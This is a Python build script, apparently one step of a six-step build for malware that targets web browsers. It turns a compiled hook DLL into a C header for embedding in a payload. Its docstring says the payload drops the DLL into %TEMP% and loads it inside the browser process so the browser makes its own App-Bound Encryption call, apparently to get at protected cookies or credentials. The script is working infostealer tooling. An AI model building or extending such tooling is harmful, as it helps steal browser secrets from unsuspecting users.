#!/usr/bin/env python3
"""mkhook.py - build_all.py step 2 of 6: embed the app-bound hook image.

Reads  build/abk_hook_build.dll  - the PE that payload/appbound.hpp drops into
%TEMP% and LoadLibrary()s inside the browser process so the browser itself makes
the App-Bound Encryption call - and rewrites  payload/hook_dll.h  as a C byte
array that browsers.hpp #includes.

The output is byte deterministic: UTF-8, CRLF, 20 bytes per line, uppercase
0xNN hex, so running this again on the same DLL always yields the same header.
"""
import os
import sys

BUILD = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(BUILD)
PAYLOAD = os.path.join(ROOT, "payload")
SRC = os.path.join(BUILD, "abk_hook_build.dll")
OUT = os.path.join(PAYLOAD, "hook_dll.h")

PER_LINE = 20
CRLF = "\r\n"


def main():
    if not os.path.isfile(SRC):
        sys.exit("mkhook: missing hook image: " + SRC)

    with open(SRC, "rb") as f:
        data = f.read()

    if data[:2] != b"MZ":
        sys.exit("mkhook: %s is not a PE image" % SRC)

    lines = [
        "#pragma once",
        "#include <cstddef>",
        "static const unsigned char HOOK_DLL[] = {",
    ]
    for i in range(0, len(data), PER_LINE):
        chunk = data[i:i + PER_LINE]
        lines.append("  " + ", ".join("0x%02X" % b for b in chunk) + ",")
    lines.append("};")
    lines.append("static const size_t HOOK_DLL_SIZE = sizeof(HOOK_DLL);")

    tmp = OUT + ".tmp"
    with open(tmp, "wb") as f:
        f.write((CRLF.join(lines) + CRLF).encode("utf-8"))
    os.replace(tmp, OUT)

    print("[hook] %s  <- %s  (%s bytes)" % (
        os.path.relpath(OUT, ROOT), os.path.basename(SRC), format(len(data), ",")))


if __name__ == "__main__":
    main()
